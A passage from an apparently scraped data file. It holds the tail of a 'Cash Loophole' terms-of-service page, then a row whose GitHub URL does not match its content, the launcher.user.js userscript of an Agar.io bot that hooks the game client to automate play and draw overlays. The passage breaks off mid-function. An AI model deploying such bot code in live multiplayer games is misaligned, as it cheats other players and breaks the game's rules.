monetary damages. You agree that Cash Loophole shall be entitled to seek and be awarded an injunction or other appropriate equitable relief to restrain any breach of Your obligations under these Terms. Accordingly, you waive any requirement that Cash Loophole post any bond or other security in the event that any injunctive or equitable relief is sought by or awarded to Cash Loophole to enforce any provision of these Terms. MISCELLANEOUS. You agree that these Terms are for the benefit of the User, Cash Loophole, and Cash Loophole licensors. Therefore, these Terms are personal to You and not assignable. No joint venture, partnership, employment, or agency relationship exists between You and Cash Loophole as a result of these Terms of Service or arising out of your use of the Site. Cash Loophole failure to insist upon or enforce strict performance of any provision of this Agreement shall not be construed as a waiver of any provision or right under these Terms or at law. Neither the course of conduct between the parties nor trade practice shall act to modify any provision of this Agreement. Cash Loophole may assign its rights and duties under this Agreement to any party and at any time, without notice to the User. Headings herein are for convenience only. These Terms of Service, along with Cash Loophole Website Privacy Policy and the Software License Agreement, represent the entire agreement between You and Cash Loophole with respect to use of the Site, and supersedes all prior or contemporaneous communications and proposals, whether electronic, oral, or written between You and Cash Loophole. SEVERABILITY. If any provision of these Terms of Service is ruled invalid or otherwise unenforceable by a court of competent jurisdiction or on account of a conflict with an applicable government regulation, such determination shall not affect the remaining provisions (or parts thereof) contained herein. Any invalid or unenforceable portion should be deemed amended in order to achieve as closely as possible the same effect as the Terms of Service as original drafted. Cash Loophole ¬© 2016 All rights reserved.",,3
0,https://github.com/DickDumBR1/Aim.git,"Skip to content Sign up Sign in This repository   Search Explore Features Enterprise Pricing  Watch 137  Star 490  Fork 1,535 Apostolique/Agar.io-bot Branch: master  Agar.io-bot/launcher.user.js @ApostoliqueApostolique 10 days ago Easier to see the borders 7 contributors @Apostolique @DarkN3ss61 @Linkaan @Timtech @henopied @Gjum @lilezek RawBlameHistory     2456 lines (2277 sloc)  93.893 kB /*The MIT License (MIT) Copyright (c) 2015 Apostolique Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.*/  // ==UserScript== // @name        AposLauncher // @namespace   AposLauncher // @include     http://agar.io/* // @version     4.123 // @grant       none // @author      http://www.twitch.tv/apostolique // ==/UserScript==  var aposLauncherVersion = 4.123;  Number.prototype.mod = function(n) {     return ((this % n) + n) % n; };  Array.prototype.peek = function() {     return this[this.length - 1]; };  var sha = ""efde0488cc2cc176db48dd23b28a20b90314352b""; function getLatestCommit() {     window.jQuery.ajax({             url: ""https://api.github.com/repos/apostolique/Agar.io-bot/git/refs/heads/master"",             cache: false,             dataType: ""jsonp""         }).done(function(data) {             console.dir(data.data);             console.log(""hmm: "" + data.data.object.sha);             sha = data.data.object.sha;              function update(prefix, name, url) {                 window.jQuery(document.body).prepend(""<div id=\'"" + prefix + ""Dialog\' style=\'position: absolute; left: 0px; right: 0px; top: 0px; bottom: 0px; z-index: 100; display: none;\'>"");                 window.jQuery(\'#\' + prefix + \'Dialog\').append(""<div id=\'"" + prefix + ""Message\' style=\'width: 350px; background-color: #FFFFFF; margin: 100px auto; border-radius: 15px; padding: 5px 15px 5px 15px;\'>"");                 window.jQuery(\'#\' + prefix + \'Message\').append(""<h2>UPDATE TIME!!!</h2>"");                 window.jQuery(\'#\' + prefix + \'Message\').append(""<p>Grab the update for: <a id=\'"" + prefix + ""Link\' href=\'"" + url + ""\' target=\\""_blank\\"">"" + name + ""</a></p>"");                 window.jQuery(\'#\' + prefix + \'Link\').on(\'click\', function() {                     window.jQuery(""#"" + prefix + ""Dialog"").hide();                     window.jQuery(""#"" + prefix + ""Dialog"").remove();                 });                 window.jQuery(""#"" + prefix + ""Dialog"").show();             }              window.jQuery.get(\'https://raw.githubusercontent.com/Apostolique/Agar.io-bot/master/launcher.user.js?\' + Math.floor((Math.random() * 1000000) + 1), function(data) {                 var latestVersion = data.replace(/(\\r\\n|\\n|\\r)/gm, """");                 latestVersion = latestVersion.substring(latestVersion.indexOf(""// @version"") + 11, latestVersion.indexOf(""// @grant""));                  latestVersion = parseFloat(latestVersion + 0.0000);                 var myVersion = parseFloat(aposLauncherVersion + 0.0000);                  if (latestVersion > myVersion) {                     update(""aposLauncher"", ""launcher.user.js"", ""https://github.com/Apostolique/Agar.io-bot/blob/"" + sha + ""/launcher.user.js/"");                 }                 console.log(\'Current launcher.user.js Version: \' + myVersion + "" on Github: "" + latestVersion);             });          }).fail(function() {}); } getLatestCommit();  console.log(""Running Bot Launcher!""); (function(d, e) {      //UPDATE     function keyAction(e) {         if (84 == e.keyCode) {             console.log(""Toggle"");             toggle = !toggle;         }         if (82 == e.keyCode) {             console.log(""ToggleDraw"");             toggleDraw = !toggleDraw;         }         if (68 == e.keyCode) {             window.setDarkTheme(!getDarkBool());         }         if (70 == e.keyCode) {             window.setShowMass(!getMassBool());         }         if (69 == e.keyCode) {             if (message.length > 0) {                 window.setMessage([]);                 window.onmouseup = function() {};                 window.ignoreStream = true;             } else {                 window.ignoreStream = false;                 window.refreshTwitch();             }         }         window.botList[botIndex].keyAction(e);     }      function humanPlayer() {         //Don\'t need to do anything.         return [getPointX(), getPointY()];     }        function pb() {          //UPDATE          window.botList = window.botList || [];          window.jQuery(\'#nick\').val(originalName);          function HumanPlayerObject() {             this.name = ""Human"";             this.keyAction = function(key) {};             this.displayText = function() {return [];};             this.mainLoop = humanPlayer;         }          var hpo = new HumanPlayerObject();          window.botList.push(hpo);          window.updateBotList();          ya = !0;         Pa();         setInterval(Pa, 18E4);          var father = window.jQuery(""#canvas"").parent();         window.jQuery(""#canvas"").remove();         father.prepend(""<canvas id=\'canvas\'>"");          G = za = document.getElementById(""canvas"");         f = G.getContext(""2d"");         G.onmousedown = function(a) {             if (Qa) {                 var b = a.clientX - (5 + m / 5 / 2),                     c = a.clientY - (5 + m / 5 / 2);                 if (Math.sqrt(b * b + c * c) <= m / 5 / 2) {                     V();                     H(17);                     return                 }             }             fa = a.clientX;             ga = a.clientY;             Aa();             V();         };         G.onmousemove = function(a) {             fa = a.clientX;             ga = a.clientY;             Aa();         };         G.onmouseup = function() {};         /firefox/i.test(navigator.userAgent) ? document.addEventListener(""DOMMouseScroll"", Ra, !1) : document.body.onmousewheel = Ra;         var a = !1,             b = !1,             c = !1;         d.onkeydown = function(l) {             //UPDATE             if (!window.jQuery(\'#nick\').is("":focus"")) {                 32 != l.keyCode || a || (V(), H(17), a = !0);                 81 != l.keyCode || b || (H(18), b = !0);                 87 != l.keyCode || c || (V(), H(21), c = !0);                 27 == l.keyCode && Sa(!0);                  //UPDATE                 keyAction(l);             }         };         d.onkeyup = function(l) {             32 == l.keyCode && (a = !1);             87 == l.keyCode && (c = !1);             81 == l.keyCode && b && (H(19), b = !1);         };         d.onblur = function() {             H(19);             c = b = a = !1         };         d.onresize = Ta;         d.requestAnimationFrame(Ua);         setInterval(V, 40);         y && e(""#region"").val(y);         Va();         ha(e(""#region"").val());         0 == Ba && y && I();         W = !0;         e(""#overlays"").show();         Ta();         d.location.hash && 6 <= d.location.hash.length && Wa(d.location.hash)     }      function Ra(a) {         J *= Math.pow(.9, a.wheelDelta / -120 || a.detail || 0);         //UPDATE         0.07 > J && (J = 0.07);         J > 4 / h && (J = 4 / h)     }      function qb() {         if (.4 > h) X = null;         else {             for (var a = Number.POSITIVE_INFINITY, b = Number.POSITIVE_INFINITY, c = Number.NEGATIVE_INFINITY, l = Number.NEGATIVE_INFINITY, d = 0, p = 0; p < v.length; p++) {                 var g = v[p];                 !g.N() || g.R || 20 >= g.size * h || (d = Math.max(g.size, d), a = Math.min(g.x, a), b = Math.min(g.y, b), c = Math.max(g.x, c), l = Math.max(g.y, l))             }             X = rb.ka({                 ca: a - 10,                 da: b - 10,                 oa: c + 10,                 pa: l + 10,                 ma: 2,                 na: 4             });             for (p = 0; p < v.length; p++)                 if (g = v[p],                     g.N() && !(20 >= g.size * h))                     for (a = 0; a < g.a.length; ++a) b = g.a[a].x, c = g.a[a].y, b < s - m / 2 / h || c < t - r / 2 / h || b > s + m / 2 / h || c > t + r / 2 / h || X.m(g.a[a])         }     }      function Aa() {         //UPDATE         if (toggle || window.botList[botIndex].name == ""Human"") {             setPoint(((fa - m / 2) / h + s), ((ga - r / 2) / h + t));         }     }      function Pa() {         null == ka && (ka = {}, e(""#region"").children().each(function() {             var a = e(this),                 b = a.val();             b && (ka[b] = a.text())         }));         e.get(""https://m.agar.io/info"", function(a) {                 var b = {},                     c;                 for (c in a.regions) {                     var l = c.split("":"")[0];                     b[l] = b[l] || 0;                     b[l] += a.regions[c].numPlayers                 }                 for (c in b) e(\'#region option[value=""\' + c + \'""]\').text(ka[c] + "" ("" + b[c] + "" players)"")             },             ""json"")     }      function Xa() {         e(""#adsBottom"").hide();         e(""#overlays"").hide();         W = !1;         Va();         d.googletag && d.googletag.pubads && d.googletag.pubads().clear(d.aa)     }      function ha(a) {         a && a != y && (e(""#region"").val() != a && e(""#region"").val(a), y = d.localStorage.location = a, e("".region-message"").hide(), e("".region-message."" + a).show(), e("".btn-needs-server"").prop(""disabled"", !1), ya && I())     }      function Sa(a) {         W || (K = null, sb(), a && (x = 1), W = !0, e(""#overlays"").fadeIn(a ? 200 : 3E3))     }      function Y(a) {         e(""#helloContainer"").attr(""data-gamemode"", a);         P = a;         e(""#gamemode"").val(a)     }      function Va() {         e(""#region"").val() ? d.localStorage.location = e(""#region"").val() : d.localStorage.location && e(""#region"").val(d.localStorage.location);         e(""#region"").val() ? e(""#locationKnown"").append(e(""#region"")) : e(""#locationUnknown"").append(e(""#region""))     }      function sb() {         la && (la = !1, setTimeout(function() {             la = !0         //UPDATE         }, 6E4 * Ya))     }      function Z(a) {         return d.i18n[a] || d.i18n_dict.en[a] || a     }      function Za() {         var a = ++Ba;         console.log(""Find "" + y + P);         e.ajax(""https://m.agar.io/findServer"", {             error: function() {                 setTimeout(Za, 1E3)             },             success: function(b) {                 a == Ba && (b.alert && alert(b.alert), Ca(""ws://"" + b.ip, b.token))             },             dataType: ""json"",             method: ""POST"",             cache: !1,             crossDomain: !0,             data: (y + P || ""?"") + ""\\n154669603""         })     }      function I() {         ya && y && (e(""#connecting"").show(), Za())     }      function Ca(a, b) {         if (q) {             q.onopen = null;             q.onmessage = null;             q.onclose = null;             try {                 q.close()             } catch (c) {}             q = null         }         Da.la && (a = ""ws://"" + Da.la);         if (null != L) {             var l = L;             L = function() {                 l(b)             }         }         if (tb) {             var d = a.split("":"");             a = d[0] + ""s://ip-"" + d[1].replace(/\\./g, ""-"").replace(/\\//g, """") + "".tech.agar.io:"" + (+d[2] + 2E3)         }         M = [];         k = [];         E = {};         v = [];         Q = [];         F = [];         z = A = null;         R = 0;         $ = !1;         console.log(""Connecting to "" + a);         //UPDATE         serverIP = a;         q = new WebSocket(a);         q.binaryType = ""arraybuffer"";         q.onopen = function() {             var a;             console.log(""socket open"");             a = N(5);             a.setUint8(0, 254);             a.setUint32(1, 5, !0);             O(a);             a = N(5);             a.setUint8(0, 255);             a.setUint32(1, 154669603, !0);             O(a);             a = N(1 + b.length);             a.setUint8(0, 80);             for (var c = 0; c < b.length; ++c) a.setUint8(c + 1, b.charCodeAt(c));             O(a);             $a()         };         q.onmessage = ub;         q.onclose = vb;         q.onerror = function() {             console.log(""socket error"")         }     }      function N(a) {         return new DataView(new ArrayBuffer(a))     }      function O(a) {         q.send(a.buffer)     }      function vb() {         $ && (ma = 500);         console.log(""socket close"");         setTimeout(I, ma);         ma *= 2     }      function ub(a) {         wb(new DataView(a.data))     }      function wb(a) {         function b() {             for (var b = """";;) {                 var d = a.getUint16(c, !0);                 c += 2;                 if (0 == d) break;                 b += String.fromCharCode(d)             }             return b         }         var c = 0;         240 == a.getUint8(c) && (c += 5);         switch (a.getUint8(c++)) {             case 16:                 xb(a, c);                 break;             case 17:                 aa = a.getFloat32(c, !0);                 c += 4;                 ba = a.getFloat32(c, !0);                 c += 4;                 ca = a.getFloat32(c, !0);                 c += 4;                 break;             case 20:                 k = [];                 M = [];                 break;             case 21:                 Ea = a.getInt16(c, !0);                 c += 2;                 Fa = a.getInt16(c, !0);                 c += 2;                 Ga || (Ga = !0, na = Ea, oa = Fa);                 break;             case 32:                 M.push(a.getUint32(c, !0));                 c += 4;                 break;             case 49:                 if (null != A) break;                 var l = a.getUint32(c, !0),                     c = c + 4;                 F = [];                 for (var d = 0; d < l; ++d) {                     var p = a.getUint32(c, !0),                         c = c + 4;                     F.push({                         id: p,                         name: b()                     })                 }                 ab();                 break;             case 50:                 A = [];                 l = a.getUint32(c, !0);                 c += 4;                 for (d = 0; d < l; ++d) A.push(a.getFloat32(c, !0)), c += 4;                 ab();                 break;             case 64:                 pa = a.getFloat64(c, !0);                 c += 8;                 qa = a.getFloat64(c, !0);                 c += 8;                 ra = a.getFloat64(c, !0);                 c += 8;                 sa = a.getFloat64(c, !0);                 c += 8;                 aa = (ra + pa) / 2;                 ba = (sa + qa) / 2;                 ca = 1;                 0 == k.length && (s = aa, t = ba, h = ca);                 break;             case 81:                 var g = a.getUint32(c, !0),                     c = c + 4,                     e = a.getUint32(c, !0),                     c = c + 4,                     f = a.getUint32(c, !0),                     c = c + 4;                 setTimeout(function() {                     S({                         e: g,                         f: e,                         d: f                     })                 }, 1200)         }     }      function xb(a, b) {         bb = C = Date.now();         $ || ($ = !0, e(""#connecting"").hide(), cb(), L && (L(), L = null));         var c = Math.random();         Ha = !1;         var d = a.getUint16(b, !0);         b += 2;         for (var u = 0; u < d; ++u) {             var p = E[a.getUint32(b, !0)],                 g = E[a.getUint32(b + 4, !0)];             b += 8;             p && g && (g.X(), g.s = g.x, g.t = g.y, g.r = g.size, g.J = p.x, g.K = p.y, g.q = g.size, g.Q =                 C)         }         for (u = 0;;) {             d = a.getUint32(b, !0);             b += 4;             if (0 == d) break;             ++u;             var f, p = a.getInt16(b, !0);             b += 4;             g = a.getInt16(b, !0);             b += 4;             f = a.getInt16(b, !0);             b += 2;             for (var h = a.getUint8(b++), w = a.getUint8(b++), m = a.getUint8(b++), h = (h << 16 | w << 8 | m).toString(16); 6 > h.length;) h = ""0"" + h;             var h = ""#"" + h,                 w = a.getUint8(b++),                 m = !!(w & 1),                 r = !!(w & 16);             w & 2 && (b += 4);             w & 4 && (b += 8);             w & 8 && (b += 16);             for (var q, n = """";;) {                 q = a.getUint16(b, !0);                 b += 2;                 if (0 == q) break;                 n += String.fromCharCode(q)             }             q = n;             n = null;             E.hasOwnProperty(d) ? (n = E[d], n.P(), n.s = n.x, n.t = n.y, n.r = n.size, n.color = h) :                 (n = new da(d, p, g, f, h, q), v.push(n), E[d] = n, n.ua = p, n.va = g);             n.h = m;             n.n = r;             n.J = p;             n.K = g;             n.q = f;             n.sa = c;             n.Q = C;             n.ba = w;             q && n.B(q); - 1 != M.indexOf(d) && -1 == k.indexOf(n) && (document.getElementById(""overlays"").style.display = ""none"", k.push(n), n.birth = getLastUpdate(), n.birthMass = (n.size * n.size / 100), 1 == k.length && (s = n.x, t = n.y, db()))              //UPDATE             interNodes[d] = window.getCells()[d];         }          //UPDATE         Object.keys(interNodes).forEach(function(element, index) {             //console.log(""start: "" + interNodes[element].updateTime + "" current: "" + D + "" life: "" + (D - interNodes[element].updateTime));             var isRemoved = !window.getCells().hasOwnProperty(element);              //console.log(""Time not updated: "" + (window.getLastUpdate() - interNodes[element].getUptimeTime()));             if (isRemoved && (window.getLastUpdate() - interNodes[element].getUptimeTime()) > 3000) {                 delete interNodes[element];             } else {                 for (var i = 0; i < getPlayer().length; i++) {                     if (isRemoved && computeDistance(getPlayer()[i].x, getPlayer()[i].y, interNodes[element].x, interNodes[element].y) < getPlayer()[i].size + 710) {                          delete interNodes[element];                         break;                     }                 }             }         });          c = a.getUint32(b, !0);         b += 4;         for (u = 0; u < c; u++) d = a.getUint32(b, !0), b += 4, n = E[d], null != n && n.X();         //UPDATE         //Ha && 0 == k.length && Sa(!1)     }      //UPDATE     function computeDistance(x1, y1, x2, y2) {         var xdis = x1 - x2; // <--- FAKE AmS OF COURSE!         var ydis = y1 - y2;         var distance = Math.sqrt(xdis * xdis + ydis * ydis);          return distance;     }      /**      * Some horse shit of some sort.      * @return Horse Shit      */     function screenDistance() {         return Math.min(computeDistance(getOffsetX(), getOffsetY(), screenToGameX(getWidth()), getOffsetY()), computeDistance(getOffsetX(), getOffsetY(), getOffsetX(), screenToGameY(getHeight())));     }      window.verticalDistance = function() {         return computeDistance(screenToGameX(0), screenToGameY(0), screenToGameX(getWidth()), screenToGameY(getHeight()));     }      /**      * A conversion from the screen\'s horizontal coordinate system      * to the game\'s horizontal coordinate system.      * @param x in the screen\'s coordinate system      * @return x in the game\'s coordinate system      */     window.screenToGameX = function(x) {         return (x - getWidth() / 2) / getRatio() + getX();     }      /**      * A conversion from the screen\'s vertical coordinate system      * to the game\'s vertical coordinate system.      * @param y in the screen\'s coordinate system      * @return y in the game\'s coordinate system      */     window.screenToGameY = function(y) {         return (y - getHeight() / 2) / getRatio() + getY();     }      window.drawPoint = function(x_1, y_1, drawColor, text) {         if (!toggleDraw) {             dPoints.push([x_1, y_1, drawColor]);             dText.push(text);         }     }      window.drawArc = function(x_1, y_1, x_2, y_2, x_3, y_3, drawColor) {         if (!toggleDraw) {             var radius = computeDistance(x_1, y_1, x_3, y_3);             dArc.push([x_1, y_1, x_2, y_2, x_3, y_3, radius, drawColor]);         }     }      window.drawLine = function(x_1, y_1, x_2, y_2, drawColor) {         if (!toggleDraw) {             lines.push([x_1, y_1, x_2, y_2, drawColor]);         }     }      window.drawCircle = function(x_1, y_1, radius, drawColor) {         if (!toggleDraw) {             circles.push([x_1, y_1, radius, drawColor]);         }     }      function V() {          //UPDATE         if (getPlayer().length == 0 && !reviving && ~~(getCurrentScore() / 100) > 0) {             console.log(""Dead: "" + ~~(getCurrentScore() / 100));             apos(\'send\', \'pageview\');         }          if (getPlayer().length == 0) {             console.log(""Revive"");             setNick(originalName);             reviving = true;         } else if (getPlayer().length > 0 && reviving) {             reviving = false;             console.log(""Done Reviving!"");         }                  if (T()) {             var a = fa - m / 2;             var b = ga - r / 2;             64 > a * a + b * b || .01 > Math.abs(eb - ia) &&                 .01 > Math.abs(fb - ja) || (eb = ia, fb = ja, a = N(13), a.setUint8(0, 16), a.setInt32(1, ia, !0), a.setInt32(5, ja, !0), a.setUint32(9, 0, !0), O(a))         }     }      function cb() {         if (T() && $ && null != K) {             var a = N(1 + 2 * K.length);             a.setUint8(0, 0);             for (var b = 0; b < K.length; ++b) a.setUint16(1 + 2 * b, K.charCodeAt(b), !0);             O(a)         }     }      function T() {         return null != q && q.readyState == q.OPEN     }      window.opCode = function(a) {         console.log(""Sending op code."");         H(parseInt(a));     }      function H(a) {         if (T()) {             var b = N(1);             b.setUint8(0, a);             O(b)         }     }      function $a() {         if (T() && null != B) {             var a = N(1 + B.length);             a.setUint8(0, 81);             for (var b = 0; b < B.length; ++b) a.setUint8(b + 1, B.charCodeAt(b));             O(a)         }     }      function Ta() {         m = d.innerWidth;         r = d.innerHeight;         za.width = G.width = m;         za.height = G.height = r;         var a = e(""#helloContainer"");         a.css(""transform"", ""none"");         var b = a.height(),             c = d.innerHeight;         b > c / 1.1 ? a.css(""transform"", ""translate(-50%, -50%) scale("" + c / b / 1.1 + "")"") : a.css(""transform"", ""translate(-50%, -50%)"");         gb()     }      function hb() {         var a;         a = Math.max(r / 1080, m / 1920);         return a *= J     }      function yb() {         if (0 != k.length) {             for (var a = 0, b = 0; b < k.length; b++) a += k[b].size;             a = Math.pow(Math.min(64 / a, 1), .4) * hb();             h = (9 * h + a) / 10         }     }      function gb() {         //UPDATE         dPoints = [];         circles = [];         dArc = [];         dText = [];         lines = [];           var a, b = Date.now();         ++zb;         C = b;         if (0 < k.length) {             yb();             for (var c = a = 0, d = 0; d < k.length; d++) k[d].P(), a += k[d].x / k.length, c += k[d].y / k.length;             aa = a;             ba = c;             ca = h;             s = (s + a) / 2;             t = (t + c) / 2;         } else s = (29 * s + aa) / 30, t = (29 * t + ba) / 30, h = (9 * h + ca * hb()) / 10;         qb();         Aa();         Ia || f.clearRect(0, 0, m, r);         Ia ? (f.fillStyle = ta ? ""#111111"" : ""#F2FBFF"", f.globalAlpha = .05, f.fillRect(0, 0, m, r), f.globalAlpha = 1) : Ab();         v.sort(function(a, b) {             return a.size == b.size ? a.id - b.id : a.size - b.size         });         f.save();         f.translate(m / 2, r / 2);         f.scale(h, h);         f.translate(-s, -t);         //UPDATE         f.save();         f.beginPath();         f.lineWidth = 5;         f.strokeStyle = (getDarkBool() ? \'#F2FBFF\' : \'#111111\');         f.moveTo(getMapStartX(), getMapStartY());         f.lineTo(getMapStartX(), getMapEndY());         f.stroke();         f.moveTo(getMapStartX(), getMapStartY());         f.lineTo(getMapEndX(), getMapStartY());         f.stroke();         f.moveTo(getMapEndX(), getMapStartY());         f.lineTo(getMapEndX(), getMapEndY());         f.stroke();         f.moveTo(getMapStartX(), getMapEndY());         f.lineTo(getMapEndX(), getMapEndY());         f.stroke();         f.restore();                  for (d = 0; d < v.length; d++) v[d].w(f);         for (d = 0; d < Q.length; d++) Q[d].w(f);         //UPDATE         if (getPlayer().length > 0) {             var moveLoc = window.botList[botIndex].mainLoop();             if (!toggle) {                 setPoint(moveLoc[0], moveLoc[1]);             }         }         customRender(f);         if (Ga) {             na = (3 * na + Ea) / 4;             oa = (3 * oa + Fa) / 4;             f.save();             f.strokeStyle = ""#FFAAAA"";             f.lineWidth = 10;             f.lineCap = ""round"";             f.lineJoin = ""round"";             f.globalAlpha = .5;             f.beginPath();             for (d = 0; d < k.length; d++) f.moveTo(k[d].x, k[d].y), f.lineTo(na, oa);             f.stroke();             f.restore();         }         f.restore();         z && z.width && f.drawImage(z, m - z.width - 10, 10);         R = Math.max(R, Bb());          //UPDATE          var currentDate = new Date();          var nbSeconds = 0;         if (getPlayer().length > 0) {             //nbSeconds = currentDate.getSeconds() + currentDate.getMinutes() * 60 + currentDate.getHours() * 3600 - lifeTimer.getSeconds() - lifeTimer.getMinutes() * 60 - lifeTimer.getHours() * 3600;             nbSeconds = (currentDate.getTime() - lifeTimer.getTime())/1000;         }          bestTime = Math.max(nbSeconds, bestTime);          var displayText = \'Score: \' + ~~(R / 100) + "" Current Time: "" + nbSeconds + "" seconds."";          0 != R && (null == ua && (ua = new va(24, ""#FFFFFF"")), ua.C(displayText), c = ua.L(), a = c.width, f.globalAlpha = .2, f.fillStyle = ""#000000"", f.fillRect(10, r - 10 - 24 - 10, a + 10, 34), f.globalAlpha = 1, f.drawImage(c, 15, r -             10 - 24 - 5));         Cb();         b = Date.now() - b;         b > 1E3 / 60 ? D -= .01 : b < 1E3 / 65 && (D += .01);.4 > D && (D = .4);         1 < D && (D = 1);         b = C - ib;         !T() || W ? (x += b / 2E3, 1 < x && (x = 1)) : (x -= b / 300, 0 > x && (x = 0));         0 < x && (f.fillStyle = ""#000000"", f.globalAlpha = .5 * x, f.fillRect(0, 0, m, r), f.globalAlpha = 1);         ib = C          drawStats(f);     }      //UPDATE     function customRender(d) {         d.save();         for (var i = 0; i < lines.length; i++) {             d.beginPath();              d.lineWidth = 5;              if (lines[i][4] == 0) {                 d.strokeStyle = ""#FF0000"";             } else if (lines[i][4] == 1) {                 d.strokeStyle = ""#00FF00"";             } else if (lines[i][4] == 2) {                 d.strokeStyle = ""#0000FF"";             } else if (lines[i][4] == 3) {                 d.strokeStyle = ""#FF8000"";             } else if (lines[i][4] == 4) {                 d.strokeStyle = ""#8A2BE2"";             } else if (lines[i][4] == 5) {                 d.strokeStyle = ""#FF69B4"";             } else if (lines[i][4] == 6) {                 d.strokeStyle = ""#008080"";             } else if (lines[i][4] == 7) {                 d.strokeStyle = (getDarkBool() ? \'#F2FBFF\' : \'#111111\');             } else {                 d.strokeStyle = ""#000000"";             }              d.moveTo(lines[i][0], lines[i][1]);             d.lineTo(lines[i][2], lines[i][3]);              d.stroke();         }         d.restore();         d.save();         for (var i = 0; i < circles.length; i++) {             if (circles[i][3] == 0) {                 d.strokeStyle = ""#FF0000"";             } else if (circles[i][3] == 1) {                 d.strokeStyle = ""#00FF00"";             } else if (circles[i][3] == 2) {                 d.strokeStyle = ""#0000FF"";             } else if (circles[i][3] == 3) {                 d.strokeStyle = ""#FF8000"";             } else if (circles[i][3] == 4) {                 d.strokeStyle = ""#8A2BE2"";             } else if (circles[i][3] == 5) {                 d.strokeStyle = ""#FF69B4"";             } else if (circles[i][3] == 6) {                 d.strokeStyle = ""#008080"";             } else if (circles[i][3] == 7) {                 d.strokeStyle = (getDarkBool() ? \'#F2FBFF\' : \'#111111\');             } else {                 d.strokeStyle = ""#000000"";             }             d.beginPath();              d.lineWidth = 10;             //d.setLineDash([5]);             d.globalAlpha = 0.3;              d.arc(circles[i][0], circles[i][1], circles[i][2], 0, 2 * Math.PI, false);              d.stroke();         }         d.restore();         d.save();         for (var i = 0; i < dArc.length; i++) {             if (dArc[i][7] == 0) {                 d.strokeStyle = ""#FF0000"";             } else if (dArc[i][7] == 1) {                 d.strokeStyle = ""#00FF00"";             } else if (dArc[i][7] == 2) {                 d.strokeStyle = ""#0000FF"";             } else if (dArc[i][7] == 3) {                 d.strokeStyle = ""#FF8000"";             } else if (dArc[i][7] == 4) {                 d.strokeStyle = ""#8A2BE2"";             } else if (dArc[i][7] == 5) {                 d.strokeStyle = ""#FF69B4"";             } else if (dArc[i][7] == 6) {                 d.strokeStyle = ""#008080"";             } else if (dArc[i][7] == 7) {                 d.strokeStyle = (getDarkBool() ? \'#F2FBFF\' : \'#111111\');             } else {                 d.strokeStyle = ""#000000"";             }              d.beginPath();              d.lineWidth = 5;              var ang1 = Math.atan2(dArc[i][1] - dArc[i][5], dArc[i][0] - dArc[i][4]);             var ang2 = Math.atan2(dArc[i][3] - dArc[i][5], dArc[i][2] - dArc[i][4]);              d.arc(dArc[i][4], dArc[i][5], dArc[i][6], ang1, ang2, false);              d.stroke();         }         d.restore();         d.save();         for (var i = 0; i < dPoints.length; i++) {             if (dText[i] == """") {                 var radius = 10;                  d.beginPath();                 d.arc(dPoints[i][0], dPoints[i][1], radius, 0, 2 * Math.PI, false);                  if (dPoints[i][2] == 0) {                     d.fillStyle = ""black"";                 } else if (dPoints[i][2] == 1) {                     d.fillStyle = ""yellow"";                 } else if (dPoints[i][2] == 2) {                     d.fillStyle = ""blue"";                 } else if (dPoints[i][2] == 3) {                     d.fillStyle = ""red"";                 } else if (dPoints[i][2] == 4) {                     d.fillStyle = ""#008080"";                 } else if (dPoints[i][2] == 5) {                     d.fillStyle = ""#FF69B4"";                 } else {                     d.fillStyle = ""#000000"";                 }                  d.fill();                 d.lineWidth = 2;                 d.strokeStyle = \'#003300\';                 d.stroke();             } else {                 var text = new va(18, (getDarkBool() ? \'#F2FBFF\' : \'#111111\'), true, (getDarkBool() ? \'#111111\' : \'#F2FBFF\'));                  text.C(dText[i]);                 var textRender = text.L();                 d.drawImage(textRender, dPoints[i][0] - (textRender.width / 2), dPoints[i][1] - (textRender.height / 2));             }          }         d.restore();     }      function drawStats(d) {         d.save()          sessionScore = Math.max(getCurrentScore(), sessionScore);          var botString = window.botList[botIndex].displayText();          var debugStrings = [];         debugStrings.push(""Bot: "" + window.botList[botIndex].name);         debugStrings.push(""Launcher: AposLauncher "" + aposLauncherVersion);         debugStrings.push(""T - Bot: "" + (!toggle ? ""On"" : ""Off""));         debugStrings.push(""R - Lines: "" + (!toggleDraw ? ""On"" : ""Off""));          for (var i = 0; i < botString.length; i++) {             debugStrings.push(botString[i]);         }          debugStrings.push("""");         debugStrings.push(""Best Score: "" + ~~(sessionScore / 100));         debugStrings.push(""Best Time: "" + bestTime + "" seconds"");         debugStrings.push("""");         debugStrings.push(serverIP);          if (getPlayer().length > 0) {             var offsetX = -getMapStartX();             var offsetY = -getMapStartY();             debugStrings.push(""Location: "" + Math.floor(getPlayer()[0].x + offsetX) + "", "" + Math.floor(getPlayer()[0].y + offsetY));         }          var offsetValue = 20;         var text = new va(18, (getDarkBool() ? \'#F2FBFF\' : \'#111111\'));          for (var i = 0; i < debugStrings.length; i++) {             text.C(debugStrings[i]);             var textRender = text.L();             d.drawImage(textRender, 20, offsetValue);             offsetValue += textRender.height;         }          if (message.length > 0) {             var mRender = [];             var mWidth = 0;             var mHeight = 0;              for (var i = 0; i < message.length; i++) {                 var mText = new va(28, \'#FF0000\', true, \'#000000\');                 mText.C(message[i]);                 mRender.push(mText.L());                  if (mRender[i].width > mWidth) {                     mWidth = mRender[i].width;                 }                 mHeight += mRender[i].height;             }              var mX = getWidth() / 2 - mWidth / 2;             var mY = 20;              d.globalAlpha = 0.4;             d.fillStyle = \'#000000\';             d.fillRect(mX - 10, mY - 10, mWidth + 20, mHeight + 20);             d.globalAlpha = 1;              var mOffset = mY;             for (var i = 0; i < mRender.length; i++) {                 d.drawImage(mRender[i], getWidth() / 2 - mRender[i].width / 2, mOffset);                 mOffset += mRender[i].height;             }         }          d.restore();     }      function Ab() {         f.fillStyle = ta ? ""#111111"" : ""#F2FBFF"";         